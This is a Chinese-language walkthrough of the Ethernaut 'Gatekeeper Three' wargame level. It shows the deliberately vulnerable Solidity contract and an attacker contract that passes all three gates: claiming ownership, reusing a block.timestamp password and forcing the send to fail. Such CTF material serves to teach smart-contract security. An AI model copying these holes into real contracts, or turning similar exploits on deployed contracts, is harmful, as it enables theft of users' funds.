# Ethernaut 28-Gatekeeper Three

## 本关目标

- 成为 entrant

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  // 接收GateThree实例
  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }

  // 检查传入的password是否和block.timestamp相同
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }

  // 初始化trick为当前合约实例地址
  function trickInit() public {
    trick = address(this);
  }

  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  // 任何账户都可以调用这个函数称为owner
  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    // 要成为owner并且msg.sender和tx.origin不同
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    // 需要调用getAllowance(uint _password)，使allowEntrance==true
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    // 当前合约要有大于0.001的ether 并且给owner转账要失败
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  // 猜对密码，设置allowEntrance = true;
  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  // 创建SimpleTrick合约并初始化
  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}
```

## 解决方案

1. 需要调用 enter()
2. 破解 gateOne，调用 construct0r()成为 owner，借助合约调用 GateThree 中的方法实现 msg.sender 和 tx.origin 不同
3. 破解 gateTwo，调用 getAllowance(uint \_password)实现 allowEntrance = true，所以需要 createTrick()，获取 SimpleTrick 合约实例，然后 password=block.timestamp
4. 破解 gateThree, 需要向 GateThree 转账，并且自己构造的合约中不能有 receive 和 fallback

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract Hack{
    GatekeeperThree private gatekeeper3;

    constructor(address payable target) {
        gatekeeper3 = GatekeeperThree(target);
    }

    function hack() external payable{
        gatekeeper3.construct0r(); // 成为owner

        gatekeeper3.createTrick(); // 获取trick实例
        gatekeeper3.getAllowance(block.timestamp); // allowEntrance true

        //0.001000000000000001
        (bool success,) = address(gatekeeper3).call{value: msg.value}(""); // 转账大于0.001ether
        require(success, "transfer ether failed!");
        gatekeeper3.enter();  // 成为entrant

    }
}
```
